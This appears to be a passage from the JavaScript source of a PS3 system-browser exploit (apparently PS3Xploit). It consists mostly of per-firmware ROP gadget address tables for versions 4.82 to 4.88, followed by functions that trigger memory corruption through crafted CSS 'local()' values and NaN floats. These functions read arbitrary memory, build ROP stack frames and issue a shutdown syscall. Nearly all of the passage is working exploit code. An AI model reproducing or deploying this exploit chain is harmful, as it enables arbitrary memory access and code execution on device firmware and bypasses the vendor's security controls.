var gadget_mod4c_addr_482=0x054AF0; //load r5 word
var gadget_mod5_addr_482=0x4238DC;
var gadget_mod6_addr_482=0x020C00;
var gadget_mod7_addr_482=0x01A6AC;
var gadget_mod8_addr_482=0x2BACB8;
var gadget_mod9_addr_482=0x010B20;
var gadget_mod10_addr_482=0x1C5794;
var gadget_mod11_addr_482=0x18B144;
var gadget_mod12_addr_482=0x63315C; //validation gadget
var gadget_mod13_addr_482=0x336870; //store_r3 gadget
var gadget_mod14_addr_482=0x633860; //load r3 dword
var gadget_mod15_addr_482=0x39D038; //load r3 word
var gadget_mod16_addr_482=0x4F732C; //set toc
var ipf1_addr_482=0x6ebb70; 
var ipf2_addr_482=0x507374; 

//CEX 4.83
var toc_addr_483 = 0x6F5558;
var default_vsh_pub_toc_483=0x6ED5AC;
var vsh_opd_patch_483=0x96D5C;
var vsh_opd_addr_483=0x6EBB70;
var vsh_toc_addr_screenshot_483=0x72067C;
var vsh_ps3xploit_key_toc_483=0x70786C;
var toc_entry1_addr_483=0x6DA3D0;
var toc_entry2_addr_483=0x725B38;//idps
var toc_entry3_addr_483=0x6DA3C8;
var toc_entry4_addr_483=0x740000;
var toc_entry5_addr_483=0x6EB6C8;
var toc_entry6_addr_483=0x0;
var gadget1_addr_483=0x097604;
var gadget2_addr_483=0x60A0E4;
var gadget3_addr_483=0x0D505C;
var gadget4_addr_483=0x229838;
var gadget5_addr_483=0x12BB1C;
var gadget6_addr_483=0x615CDC;//malloc
var gadget7_addr_483=0x01FFD0;//memset
var gadget8_addr_483=0x020000;//memcpy
var gadget9_addr_483=0x029B08;
var gadget10_addr_483=0x62E024;
var gadget11_addr_483=0x59A4B0;
var gadget12_addr_483=0x0C864C;
var gadget13_addr_483=0x48E5A8;//free
var gadget14_addr_483=0x48C7A0;
var gadget15_addr_483=0x489C88;
var gadget_mod1_addr_483=0x60EFD8;
var gadget_mod2_addr_483=0x013B74;
var gadget_mod3_addr_483=0x0B8E00;
var gadget_mod4a_addr_483=0x0D9684;
var gadget_mod4b_addr_483=0x42C778;
var gadget_mod4c_addr_483=0x054AF0; //load r5 word
var gadget_mod5_addr_483=0x4238DC;
var gadget_mod6_addr_483=0x020C00;
var gadget_mod7_addr_483=0x01A6AC;
var gadget_mod8_addr_483=0x2BACB8;
var gadget_mod9_addr_483=0x010B20;
var gadget_mod10_addr_483=0x1C5794;
var gadget_mod11_addr_483=0x18B144;
var gadget_mod12_addr_483=0x6331FC; //validation gadget
var gadget_mod13_addr_483=0x336870; //store_r3 gadget
var gadget_mod14_addr_483=0x633900; //load r3 dword
var gadget_mod15_addr_483=0x39D038; //load r3 word
var gadget_mod16_addr_483=0x4F732C; //set toc
var ipf1_addr_483=0x6ebb78; 
var ipf2_addr_483=0x507374; 

//DEX 4.84
var toc_addr_484_d = 0x705648;
var prx_explore_plugin_toc_addr_484_d=0x0;// size 0x30
var vsh_whatsnew_patch_addr_484_d=0x0;// explore_plugin
var vsh_whatsnew_xml_addr_484_d=0x0;
var vsh_opd_addr_484_d=0x6FBC60;
var vsh_opd_patch_484_d=0x096E14;
var vsh_toc_addr_screenshot_484_d=0x73100C;
var vsh_ps3xploit_key_toc_484_d=0x7181D4;
var default_vsh_pub_toc_484_d=0x6FD69C;
var toc_entry1_addr_484_d=0x6EA4B8;
var toc_entry2_addr_484_d=0x7364C8;// idps
var toc_entry3_addr_484_d=0x6EA4B0;
var toc_entry4_addr_484_d=0x750000;
var toc_entry5_addr_484_d=0x6FB7B8;
var toc_entry6_addr_484_d=0x0;
var gadget1_addr_484_d=0x0976BC;
var gadget2_addr_484_d=0x611D00;
var gadget3_addr_484_d=0x0DA5A8;
var gadget4_addr_484_d=0x231120;
var gadget5_addr_484_d=0x1329D8;
var gadget6_addr_484_d=0x61D8F8;// malloc
var gadget7_addr_484_d=0x020084;// memset
var gadget8_addr_484_d=0x0200B4;// memcpy
var gadget9_addr_484_d=0x029BBC;
var gadget10_addr_484_d=0x635C40;//addi 0xC0
var gadget11_addr_484_d=0x5A20A4;// sprintf
var gadget12_addr_484_d=0x0CD640;// reboot prep sub
var gadget13_addr_484_d=0x49619C;// free
var gadget14_addr_484_d=0x494394;
var gadget15_addr_484_d=0x49187C;
var gadget_mod1_addr_484_d=0x616BF4;
var gadget_mod2_addr_484_d=0x013B74;
var gadget_mod3_addr_484_d=0x0B8EB8;
var gadget_mod4a_addr_484_d=0x0DEBD8;
var gadget_mod4b_addr_484_d=0x43436C;
var gadget_mod4c_addr_484_d=0x054BA8;
var gadget_mod5_addr_484_d=0x42B4D0;
var gadget_mod6_addr_484_d=0x020CB4;
var gadget_mod7_addr_484_d=0x01A6AC;
var gadget_mod8_addr_484_d=0x2C24E0;
var gadget_mod9_addr_484_d=0x010B20;
var gadget_mod10_addr_484_d=0x1CD0B8;
var gadget_mod11_addr_484_d=0x192190;
var gadget_mod12_addr_484_d=0x63AE18;
var gadget_mod13_addr_484_d=0x33E484;
var gadget_mod14_addr_484_d=0x63B51C;
var gadget_mod15_addr_484_d=0x3A4C2C;
var gadget_mod16_addr_484_d=0x4FEF20;
var e_fopen_write_close=0x42B70C;
var ipf1_addr_484_d=0x6fbc68; 
var ipf2_addr_484_d=0x50EF68; 

//CEX 4.84
var toc_addr_484 = 0x6F5558;
var default_vsh_pub_toc_484=0x6ED5AC;
var vsh_opd_patch_484=0x96D5C;
var vsh_opd_addr_484=0x6EBB70;
var vsh_toc_addr_screenshot_484=0x72067C;
var vsh_ps3xploit_key_toc_484=0x70786C;
var toc_entry1_addr_484=0x6DA3D0;
var toc_entry2_addr_484=0x725B38;//idps
var toc_entry3_addr_484=0x6DA3C8;
var toc_entry4_addr_484=0x740000;
var toc_entry5_addr_484=0x6EB6C8;
var toc_entry6_addr_484=0x0;
var gadget1_addr_484=0x097604;
var gadget2_addr_484=0x60A0E4;
var gadget3_addr_484=0x0D505C;
var gadget4_addr_484=0x229838;
var gadget5_addr_484=0x12BB1C;
var gadget6_addr_484=0x615CDC;//malloc
var gadget7_addr_484=0x01FFD0;//memset
var gadget8_addr_484=0x020000;//memcpy
var gadget9_addr_484=0x029B08;
var gadget10_addr_484=0x62E024;
var gadget11_addr_484=0x59A4B0;
var gadget12_addr_484=0x0C864C;
var gadget13_addr_484=0x48E5A8;//free
var gadget14_addr_484=0x48C7A0;
var gadget15_addr_484=0x489C88;
var gadget_mod1_addr_484=0x60EFD8;
var gadget_mod2_addr_484=0x013B74;
var gadget_mod3_addr_484=0x0B8E00;
var gadget_mod4a_addr_484=0x0D9684;
var gadget_mod4b_addr_484=0x42C778;
var gadget_mod4c_addr_484=0x054AF0; //load r5 word
var gadget_mod5_addr_484=0x4238DC;
var gadget_mod6_addr_484=0x020C00;
var gadget_mod7_addr_484=0x01A6AC;
var gadget_mod8_addr_484=0x2BACB8;
var gadget_mod9_addr_484=0x010B20;
var gadget_mod10_addr_484=0x1C5794;
var gadget_mod11_addr_484=0x18B144;
var gadget_mod12_addr_484=0x6331FC; //validation gadget
var gadget_mod13_addr_484=0x336870; //store_r3 gadget
var gadget_mod14_addr_484=0x633900; //load r3 dword
var gadget_mod15_addr_484=0x39D038; //load r3 word
var gadget_mod16_addr_484=0x4F732C; //set toc
var ipf1_addr_484=0x6ebb78; 
var ipf2_addr_484=0x507374; 

//CEX 4.85
var toc_addr_485 = 0x6F5558;
var default_vsh_pub_toc_485=0x6ED5AC;
var vsh_opd_patch_485=0x96D5C;
var vsh_opd_addr_485=0x6EBB70;
var vsh_toc_addr_screenshot_485=0x72067C;
var vsh_ps3xploit_key_toc_485=0x70786C;
var toc_entry1_addr_485=0x6DA3D0;
var toc_entry2_addr_485=0x725B38;//idps
var toc_entry3_addr_485=0x6DA3C8;
var toc_entry4_addr_485=0x740000;
var toc_entry5_addr_485=0x6EB6C8;
var toc_entry6_addr_485=0x0;
var gadget1_addr_485=0x097604;
var gadget2_addr_485=0x60A0E4;
var gadget3_addr_485=0x0D505C;
var gadget4_addr_485=0x229838;
var gadget5_addr_485=0x12BB1C;
var gadget6_addr_485=0x615CDC;//malloc
var gadget7_addr_485=0x01FFD0;//memset
var gadget8_addr_485=0x020000;//memcpy
var gadget9_addr_485=0x029B08;
var gadget10_addr_485=0x62E024;
var gadget11_addr_485=0x59A4B0;
var gadget12_addr_485=0x0C864C;
var gadget13_addr_485=0x48E5A8;//free
var gadget14_addr_485=0x48C7A0;
var gadget15_addr_485=0x489C88;
var gadget_mod1_addr_485=0x60EFD8;
var gadget_mod2_addr_485=0x013B74;
var gadget_mod3_addr_485=0x0B8E00;
var gadget_mod4a_addr_485=0x0D9684;
var gadget_mod4b_addr_485=0x42C778;
var gadget_mod4c_addr_485=0x054AF0; //load r5 word
var gadget_mod5_addr_485=0x4238DC;
var gadget_mod6_addr_485=0x020C00;
var gadget_mod7_addr_485=0x01A6AC;
var gadget_mod8_addr_485=0x2BACB8;
var gadget_mod9_addr_485=0x010B20;
var gadget_mod10_addr_485=0x1C5794;
var gadget_mod11_addr_485=0x18B144;
var gadget_mod12_addr_485=0x6331FC; //validation gadget
var gadget_mod13_addr_485=0x336870; //store_r3 gadget
var gadget_mod14_addr_485=0x633900; //load r3 dword
var gadget_mod15_addr_485=0x39D038; //load r3 word
var gadget_mod16_addr_485=0x4F732C; //set toc
var ipf1_addr_485=0x6ebb78; 
var ipf2_addr_485=0x507374; 

//CEX 4.86
var toc_addr_486 = 0x6F5558;
var default_vsh_pub_toc_486=0x6ED5AC;
var vsh_opd_patch_486=0x96D5C;
var vsh_opd_addr_486=0x6EBB70;
var vsh_toc_addr_screenshot_486=0x72082C;// Updated From 4.83/4.84/4.85
var vsh_ps3xploit_key_toc_486=0x707A1C;// Updated From 4.83/4.84/4.85
var toc_entry1_addr_486=0x6DA3D0;
var toc_entry2_addr_486=0x725CE8;//idps Updated From 4.83/4.84/4.85
var toc_entry3_addr_486=0x6DA3C8;
var toc_entry4_addr_486=0x740000;
var toc_entry5_addr_486=0x6EB6C8;
var toc_entry6_addr_486=0x0;
var gadget1_addr_486=0x097604;
var gadget2_addr_486=0x60A0E4;
var gadget3_addr_486=0x0D505C;
var gadget4_addr_486=0x229838;
var gadget5_addr_486=0x12BB1C;
var gadget6_addr_486=0x615CDC;//malloc
var gadget7_addr_486=0x01FFD0;//memset
var gadget8_addr_486=0x020000;//memcpy
var gadget9_addr_486=0x029B08;
var gadget10_addr_486=0x62E024;
var gadget11_addr_486=0x59A4B0;// sprintf
var gadget12_addr_486=0x0C864C;
var gadget13_addr_486=0x48E5A8;//free
var gadget14_addr_486=0x48C7A0;
var gadget15_addr_486=0x489C88;
var gadget_mod1_addr_486=0x60EFD8;
var gadget_mod2_addr_486=0x013B74;
var gadget_mod3_addr_486=0x0B8E00;
var gadget_mod4a_addr_486=0x0D9684;
var gadget_mod4b_addr_486=0x42C778;
var gadget_mod4c_addr_486=0x054AF0; //load r5 word
var gadget_mod5_addr_486=0x4238DC;
var gadget_mod6_addr_486=0x020C00;
var gadget_mod7_addr_486=0x01A6AC;
var gadget_mod8_addr_486=0x2BACB8;// graceful exit
var gadget_mod9_addr_486=0x010B20;
var gadget_mod10_addr_486=0x1C5794;
var gadget_mod11_addr_486=0x18B144;
var gadget_mod12_addr_486=0x6331FC; //validation gadget
var gadget_mod13_addr_486=0x336870; //store_r3 gadget
var gadget_mod14_addr_486=0x633900; //load r3 dword
var gadget_mod15_addr_486=0x39D038; //load r3 word
var gadget_mod16_addr_486=0x4F732C; //set toc
var ipf1_addr_486=0x6ebb78; 
var ipf2_addr_486=0x507374; 

//CEX 4.87
var toc_addr_487 = 0x6F5558;
var default_vsh_pub_toc_487=0x6ED5AC;
var vsh_opd_patch_487=0x96D5C;
var vsh_opd_addr_487=0x6EBB70;
var vsh_toc_addr_screenshot_487=0x72082C;// Updated From 4.83/4.84/4.85
var vsh_ps3xploit_key_toc_487=0x707A1C;// Updated From 4.83/4.84/4.85
var toc_entry1_addr_487=0x6DA3D0;
var toc_entry2_addr_487=0x725CE8;//idps Updated From 4.83/4.84/4.85
var toc_entry3_addr_487=0x6DA3C8;
var toc_entry4_addr_487=0x740000;
var toc_entry5_addr_487=0x6EB6C8;
var toc_entry6_addr_487=0x0;
var gadget1_addr_487=0x097604;
var gadget2_addr_487=0x60A0E4;
var gadget3_addr_487=0x0D505C;
var gadget4_addr_487=0x229838;
var gadget5_addr_487=0x12BB1C;
var gadget6_addr_487=0x615CDC;//malloc
var gadget7_addr_487=0x01FFD0;//memset
var gadget8_addr_487=0x020000;//memcpy
var gadget9_addr_487=0x029B08;
var gadget10_addr_487=0x62E024;
var gadget11_addr_487=0x59A4B0;// sprintf
var gadget12_addr_487=0x0C864C;
var gadget13_addr_487=0x48E5A8;//free
var gadget14_addr_487=0x48C7A0;
var gadget15_addr_487=0x489C88;
var gadget_mod1_addr_487=0x60EFD8;
var gadget_mod2_addr_487=0x013B74;
var gadget_mod3_addr_487=0x0B8E00;
var gadget_mod4a_addr_487=0x0D9684;
var gadget_mod4b_addr_487=0x42C778;
var gadget_mod4c_addr_487=0x054AF0; //load r5 word
var gadget_mod5_addr_487=0x4238DC;
var gadget_mod6_addr_487=0x020C00;
var gadget_mod7_addr_487=0x01A6AC;
var gadget_mod8_addr_487=0x2BACB8;// graceful exit
var gadget_mod9_addr_487=0x010B20;
var gadget_mod10_addr_487=0x1C5794;
var gadget_mod11_addr_487=0x18B144;
var gadget_mod12_addr_487=0x6331FC; //validation gadget
var gadget_mod13_addr_487=0x336870; //store_r3 gadget
var gadget_mod14_addr_487=0x633900; //load r3 dword
var gadget_mod15_addr_487=0x39D038; //load r3 word
var gadget_mod16_addr_487=0x4F732C; //set toc
var ipf1_addr_487=0x6ebb78; 
var ipf2_addr_487=0x507374; 

//CEX 4.88
var toc_addr_488 = 0x6F5558;
var default_vsh_pub_toc_488=0x6ED5AC;
var vsh_opd_patch_488=0x96D5C;
var vsh_opd_addr_488=0x6EBB70;
var vsh_toc_addr_screenshot_488=0x72082C;// Updated From 4.83+
var vsh_ps3xploit_key_toc_488=0x707A1C;// Updated From 4.83+
var toc_entry1_addr_488=0x6DA3D0;
var toc_entry2_addr_488=0x725CE8;//IDPS Updated From 4.83+
var toc_entry3_addr_488=0x6DA3C8;
var toc_entry4_addr_488=0x740000;
var toc_entry5_addr_488=0x6EB6C8;
var toc_entry6_addr_488=0x0;
var gadget1_addr_488=0x097604;
var gadget2_addr_488=0x60A0E4;
var gadget3_addr_488=0x0D505C;
var gadget4_addr_488=0x229838;
var gadget5_addr_488=0x12BB1C;
var gadget6_addr_488=0x615CDC;//malloc
var gadget7_addr_488=0x01FFD0;//memset
var gadget8_addr_488=0x020000;//memcpy
var gadget9_addr_488=0x029B08;
var gadget10_addr_488=0x62E024;
var gadget11_addr_488=0x59A4B0;// sprintf
var gadget12_addr_488=0x0C864C;
var gadget13_addr_488=0x48E5A8;//free
var gadget14_addr_488=0x48C7A0;
var gadget15_addr_488=0x489C88;
var gadget_mod1_addr_488=0x60EFD8;
var gadget_mod2_addr_488=0x013B74;
var gadget_mod3_addr_488=0x0B8E00;
var gadget_mod4a_addr_488=0x0D9684;
var gadget_mod4b_addr_488=0x42C778;
var gadget_mod4c_addr_488=0x054AF0; //load r5 word
var gadget_mod5_addr_488=0x4238DC;
var gadget_mod6_addr_488=0x020C00;
var gadget_mod7_addr_488=0x01A6AC;
var gadget_mod8_addr_488=0x2BACB8;// graceful exit
var gadget_mod9_addr_488=0x010B20;
var gadget_mod10_addr_488=0x1C5794;
var gadget_mod11_addr_488=0x18B144;
var gadget_mod12_addr_488=0x6331FC; //validation gadget
var gadget_mod13_addr_488=0x336870; //store_r3 gadget
var gadget_mod14_addr_488=0x633900; //load r3 dword
var gadget_mod15_addr_488=0x39D038; //load r3 word
var gadget_mod16_addr_488=0x4F732C; //set toc
var ipf1_addr_488=0x6ebb78; 
var ipf2_addr_488=0x507374; 


function hexh2bin(hex_val)
{
	return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function hexdw2bin(hex_val) // 32bit support only (due to javascript 53bit integer limitation)
{
	return hexw2bin(0) + hexw2bin(hex_val); // 00000000 padding
}
function k_hexdw2bin(hex_val) // 32bit support only (due to javascript 53bit integer limitation)
{
	return hexw2bin(0x80000000) + hexw2bin(hex_val); // 80000000 padding
}
function logAdd(txt)
{
	if(debug===true)
	{
		if(document.getElementById('log').innerHTML===''){setInnerHTML(document.getElementById('log'),hr);}
		addInnerHTML(document.getElementById('log'),txt+br); 
	}
}
function clearLogEntry()
{
	setInnerHTML(document.getElementById('log'),'');
}
function clearResultEntry()
{
	setInnerHTML(document.getElementById('result'),'');
}
function writeEnvInfo()
{
	setInnerHTML(document.getElementById('footer'),hr+"<h3>PS3 System Browser Info:</h3>"+navigator.userAgent+br+navigator.appName+" (" + navigator.platform + ")"+br+new Date().toTimeString() + br);
}

String.prototype.setCharAt = function(index,chr)
{
	if(index > this.length-1) {return this;}
	return this.substr(0,index)+chr+this.substr(index+1);
};
String.prototype.toHex8 = function()
{
	return ('00' + this).substr(-2);
};
String.prototype.toHex16 = function()
{
	return ('0000' + this).substr(-4);
};
String.prototype.toHex32 = function()
{
	return ('00000000' + this).substr(-8);
};
String.prototype.asciiAt = function(i)
{
	return this.charCodeAt(i)&0xFF;
};
String.prototype.toAscii = function(hex_16)
{
    var ascii='';
	var i=0;
	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
	return ascii;
};
String.prototype.convert=function(ascii)
{
	if(this.length<1){return '';}
	var asciistr='';var asciichr='';var i=0;var ret=[];
	if(ascii===true){asciistr = this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    while(i<asciistr.length){
		asciichr = asciistr.substr(i, 4);
		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
		i+=4;
    }
    return ret.join('');
};
String.prototype.convertedSize = function(ascii)
{
	if(this.length<1){return 0;}
	var asciistr='';
	if(ascii===true){asciistr=this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
	return asciistr.length/2;
};
String.prototype.replaceAt=function(index, ch)
{
	return this.substr(0,index)+ch+this.substr(index+ch.length);
};
String.prototype.repeat = function(num)
{
    return new Array(num+1).join(this);
};
//#########################################################################################################################################################################
Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length===1) {return data[0];}
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign+'0.';
        while(mag++){z+='0';}
        return z+str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) {z += '0';}
    return str + z;
};
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber=0;
	var bits=[];
	var i;
	var j;
	var byte;
	for (i=bytes.length;i;i-=1)
	{
		byte=bytes[i-1];
		for(j=8;j;j-=1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(address, size)
{
	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
	else {throw "exploit div: HTML error!";}
}
function checkMemory(address, size, len)
{
	if(size<len){throw "checkMemory function arguments error! size=0x"+size.toString(16)+" < len=0x"+size.toString(16);}
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		if(debug===true)
		{
			var x=document.getElementById('exploit').style.src.substr(6,len);
			logAdd("checkMemory: "+x.toAscii(true));
			return x;
		}
		return document.getElementById('exploit').style.src.substr(6,len);
	}
	else {throw "exploit div: HTML error!";}
}
function checkMemory2(address, size, len, sub)
{
	if(size<len){throw "checkMemory function arguments error! size=0x"+size.toString(16)+" < len=0x"+size.toString(16);}
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		if(debug===true)
		{
			var x=document.getElementById('exploit').style.src.substr(sub,len);
			logAdd("checkMemory: "+x.toAscii(true));
			return x;
		}
		return document.getElementById('exploit').style.src.substr(sub,len);
	}
	else {throw "exploit div: HTML error!";}
}
function s2hex(str)
{
	var hex = [];
	var  i = 0;
    for (;i < str.length; i++) {
		hex.push(hex16(str.charCodeAt(i).toString(16)));
    }
	return hex.join("");
}

function hex32(s)
{
	return ('00000000' + s).substr(-8);
}

function hex16(s)
{
	return ('0000' + s).slice(-4)
}

function hex8(s)
{
	return ('00' + s).substr(-2);
}
function trigger(exploit_addr){
	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
	else {throw "trigger div: HTML error!";}
}
function forceLog(str)
{
	var d=true;
	if(debug===false){d=false;debug=true;}
	logAdd(str);
	debug=d;
}
function reboot_frame(shutdown_type)
{
	return hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,shutdown_type,0,0,0,0,0,0,0);
}
function init_run(init_param,bs,sz,bs_off,sz_ext)
{
	if(init_param===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
	if(t_out!==0){clearTimeout(t_out);t_out=0;}
	offset_array=[];
	disable_all();
	clearLogEntry();
	store_idx_arr1=[];
	store_idx_arr2=[];
	xtra_data_addr=0;
	stack_frame_addr=0;
	jump_2_addr=0;
	jump_1_addr=0;
	search_max_threshold=70*0x100000; // 70Mb maximum memory search
	search_base=bs;//0x80190000;//
	search_size=sz;
	search_base_off=bs_off;
	search_size_ext=sz_ext;
	total_loops++;
}
function init_end(str)
{
	var sf=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length);
	var x=checkMemory(xtra_data_addr-0x4,0x2000,xtra_data.length);
	var j2=checkMemory(jump_2_addr-0x4,0x800,jump_2.length);
	var j1=checkMemory(jump_1_addr-0x4,0x800,jump_1.length);
	if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
	{
		if(t_out!==0){clearTimeout(t_out);}
		showResult(str);
		enable_trigger();
	}
	else
	{
		if(x!==xtra_data)logAdd("xtra_data mismatch in memory!");
		if(sf!==stack_frame)logAdd("stack_frame mismatch in memory!");
		if(j2!==jump_2)logAdd("jump_2 mismatch in memory!");
		if(j1!==jump_1)logAdd("jump_1 mismatch in memory!");
		load_check();
	}
}
//####################################################################################################################################################################
function rop_exit_10val(suc,fail,fail1,fail2,fail3,fail4,fail5,fail6,fail7,fail8,fail9,fail10)
{
	// operations to execute on ROP exit
	var t_val1=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr1[1],2).toAscii(true);
	var t_val3=xtra_data.substr(store_idx_arr1[2],2).toAscii(true);
	var t_val4=xtra_data.substr(store_idx_arr1[3],2).toAscii(true);
	var t_val5=xtra_data.substr(store_idx_arr1[4],2).toAscii(true);
	var t_val6=xtra_data.substr(store_idx_arr1[5],2).toAscii(true);
	var t_val7=xtra_data.substr(store_idx_arr1[6],2).toAscii(true);
	var t_val8=xtra_data.substr(store_idx_arr1[7],2).toAscii(true);
	var t_val9=xtra_data.substr(store_idx_arr1[8],2).toAscii(true);
	var t_val10=xtra_data.substr(store_idx_arr1[9],2).toAscii(true);
	
	var t_val11=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var t_val12=xtra_data.substr(store_idx_arr2[1],2).toAscii(true);
	var t_val13=xtra_data.substr(store_idx_arr2[2],2).toAscii(true);
	var t_val14=xtra_data.substr(store_idx_arr2[3],2).toAscii(true);
	var t_val15=xtra_data.substr(store_idx_arr2[4],2).toAscii(true);
	var t_val16=xtra_data.substr(store_idx_arr2[5],2).toAscii(true);
	var t_val17=xtra_data.substr(store_idx_arr2[6],2).toAscii(true);
	var t_val18=xtra_data.substr(store_idx_arr2[7],2).toAscii(true);
	var t_val19=xtra_data.substr(store_idx_arr2[8],2).toAscii(true);
	var t_val20=xtra_data.substr(store_idx_arr2[9],2).toAscii(true);
	
	var tmp;
	
	if(
	(parseInt(t_val1,16)!==0)&&
	(parseInt(t_val2,16)!==0)&&
	(parseInt(t_val3,16)!==0)&&
	(parseInt(t_val4,16)!==0)&&
	(parseInt(t_val5,16)!==0)&&
	(parseInt(t_val6,16)!==0)&&
	(parseInt(t_val7,16)!==0)&&
	(parseInt(t_val8,16)!==0)&&
	(parseInt(t_val9,16)!==0)&&
	(parseInt(t_val10,16)!==0)&&
	
	(parseInt(t_val1,16)===(parseInt(t_val11,16)))&&
	(parseInt(t_val2,16)===(parseInt(t_val12,16)))&&
	(parseInt(t_val3,16)===(parseInt(t_val13,16)))&&
	(parseInt(t_val4,16)===(parseInt(t_val14,16)))&&
	(parseInt(t_val5,16)===(parseInt(t_val15,16)))&&
	(parseInt(t_val6,16)===(parseInt(t_val16,16)))&&
	(parseInt(t_val7,16)===(parseInt(t_val17,16)))&&
	(parseInt(t_val8,16)===(parseInt(t_val18,16)))&&
	(parseInt(t_val9,16)===(parseInt(t_val19,16)))&&
	(parseInt(t_val10,16)===(parseInt(t_val20,16)))
	)
	{
		var el=document.getElementById('auto_close');
		if(el)
		{
			if(el.checked===true)window.close();
		}
		tmp=suc;
	}
	else 
	{
		if((parseInt(t_val1,16)!==parseInt(t_val11,16))||(parseInt(t_val1,16)===0))fail+=fail1;
		if((parseInt(t_val2,16)!==parseInt(t_val12,16))||(parseInt(t_val2,16)===0))fail+=fail2;
		if((parseInt(t_val3,16)!==parseInt(t_val13,16))||(parseInt(t_val3,16)===0))fail+=fail3;
		if((parseInt(t_val4,16)!==parseInt(t_val14,16))||(parseInt(t_val4,16)===0))fail+=fail4;
		if((parseInt(t_val5,16)!==parseInt(t_val15,16))||(parseInt(t_val5,16)===0))fail+=fail5;
		if((parseInt(t_val6,16)!==parseInt(t_val16,16))||(parseInt(t_val6,16)===0))fail+=fail6;
		if((parseInt(t_val7,16)!==parseInt(t_val17,16))||(parseInt(t_val7,16)===0))fail+=fail7;
		if((parseInt(t_val8,16)!==parseInt(t_val18,16))||(parseInt(t_val8,16)===0))fail+=fail8;
		if((parseInt(t_val9,16)!==parseInt(t_val19,16))||(parseInt(t_val9,16)===0))fail+=fail9;
		if((parseInt(t_val10,16)!==parseInt(t_val20,16))||(parseInt(t_val0,16)===0))fail+=fail10;
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit_5val(suc,fail,fail1,fail2,fail3,fail4,fail5)
{
	// operations to execute on ROP exit
	var t_val=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr1[1],2).toAscii(true);
	var t_val3=xtra_data.substr(store_idx_arr1[2],2).toAscii(true);
	var t_val4=xtra_data.substr(store_idx_arr1[3],2).toAscii(true);
	var t_val5=xtra_data.substr(store_idx_arr1[4],2).toAscii(true);
	var t_val6=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var t_val7=xtra_data.substr(store_idx_arr2[1],2).toAscii(true);
	var t_val8=xtra_data.substr(store_idx_arr2[2],2).toAscii(true);
	var t_val9=xtra_data.substr(store_idx_arr2[3],2).toAscii(true);
	var t_val10=xtra_data.substr(store_idx_arr2[4],2).toAscii(true);
	var tmp;
	//logAdd('store_idx='+store_idx_arr1[0].toString()+br+'t_val='+t_val+br+'store_idx2='+store_idx_arr1[1].toString()+br+'t_val2='+t_val2+br+'store_idx3='+store_idx_arr1[2].toString()+br+'t_val3='+t_val3);
	//logAdd('store_idx4='+store_idx_arr1[3].toString()+br+'t_val4='+t_val4+br+'store_idx5='+store_idx_arr1[4].toString()+br+'t_val5='+t_val5+br+'store_idx6='+store_idx_arr2[0].toString()+br+'t_val6='+t_val6);
	//logAdd('store_idx7='+store_idx_arr2[1].toString()+br+'t_val7='+t_val7+br+'store_idx8='+store_idx_arr2[2].toString()+br+'t_val8='+t_val8+br+'store_idx9='+store_idx_arr2[3].toString()+br+'t_val9='+t_val9+br+'store_idx10='+store_idx_arr2[4].toString()+br+'t_val10='+t_val10);
